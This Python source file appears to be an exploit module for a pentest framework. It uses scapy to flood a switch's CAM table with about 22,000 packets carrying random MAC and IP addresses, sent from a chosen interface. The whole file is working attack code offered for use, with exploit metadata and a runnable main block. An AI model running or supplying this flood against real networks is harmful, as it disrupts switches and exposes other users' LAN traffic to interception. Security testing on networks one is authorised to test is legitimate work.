from Sploit import Sploit
from collections import OrderedDict

#from __future__ import print_function
import sys
import argparse
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp

INFO = {}
INFO['NAME'] = "CAM overflow"
INFO['DESCRIPTION'] = "Overload CAM table on switch"
INFO['VENDOR'] = "--"
INFO['CVE Name'] = "--"
INFO['NOTES'] = """
"""
INFO['DOWNLOAD_LINK'] = "https://github.com/dm-ts/modulesEAST"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "1.0 14.02.20"
INFO['PATH'] = "Developed/" #folder on website
INFO['AUTHOR'] = "dmts"

OPTIONS = OrderedDict()
OPTIONS["INTERFACE"] = "eth0", dict(description = 'Interface to use')
#####################################################################
class exploit(Sploit):
	def __init__(self,interface="",logger=None):
		Sploit.__init__(self, logger=logger)
		self.name = INFO['NAME'] 
		self.interface = interface
	def args(self):
		self.args = Sploit.args(self, OPTIONS)
		self.interface = self.args.get("INTERFACE", self.interface)

	def generate_packets(self):
		# Initialize list to hold all the packets
    		packet_list = []
		# Create packets with random addresses
    		for i in xrange(1,22000):
        		packet= Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
	        	packet_list.append(packet)
    		return packet_list

	def cam_overflow(self,packet_list,interface):
		# Send packets
		sendp(packet_list, iface=interface,verbose=None)
		self.log('[+] Poison finished .')#;sys.stdout.flush()

	def run(self):
		self.args()
		self.log('Starting')
		######### MAIN CODE ###########
		self.log('[*] Creating packets...')
		packet_list = self.generate_packets()
    		self.log('[+] DONE')
		self.log('[*] Poisoning CAM table (Interface = '+self.interface+')')
		self.cam_overflow(packet_list,self.interface)		
		###############################
		self.finish(True)

######################################################################
if __name__ == '__main__':
    print"Running exploit %s .. " % INFO['NAME']
    e = exploit()
    e.run()



